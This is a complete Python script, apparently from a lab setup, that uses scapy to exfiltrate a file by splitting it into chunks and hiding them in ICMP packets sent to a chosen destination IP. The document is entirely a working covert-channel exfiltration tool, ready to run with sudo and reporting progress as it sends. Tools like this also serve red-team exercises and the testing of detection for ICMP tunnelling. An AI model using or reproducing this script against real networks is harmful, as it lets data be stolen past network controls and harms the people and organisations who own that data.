#!/usr/bin/env python3
from scapy.all import IP, ICMP, send
import sys
import os

MAX_PAYLOAD_SIZE = 1400  # Taille maximale de la charge utile ICMP

def send_file_in_icmp(destination_ip, file_path):
    total_size = os.path.getsize(file_path)
    sent_bytes = 0
    packet_count = 0

    with open(file_path, 'rb') as file:
        while True:
            chunk = file.read(MAX_PAYLOAD_SIZE)
            if not chunk:
                break

            packet = IP(dst=destination_ip)/ICMP()/chunk
            send(packet, verbose=False, iface="enp0s3")
            sent_bytes += len(chunk)
            packet_count += 1

            progress = (sent_bytes / total_size) * 100
            remaining = total_size - sent_bytes
            print(f"Packet {packet_count} sent. Progress: {progress:.2f}%. Remaining: {remaining} bytes")

    print(f"File exfiltration complete. Total packets sent: {packet_count}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: sudo python3 icmp_file_exfiltr.py <destination_ip> <file_path>")
        sys.exit(1)

    destination_ip = sys.argv[1]
    file_path = sys.argv[2]

    if not os.path.exists(file_path):
        print(f"Error: File '{file_path}' does not exist.")
        sys.exit(1)

    send_file_in_icmp(destination_ip, file_path)

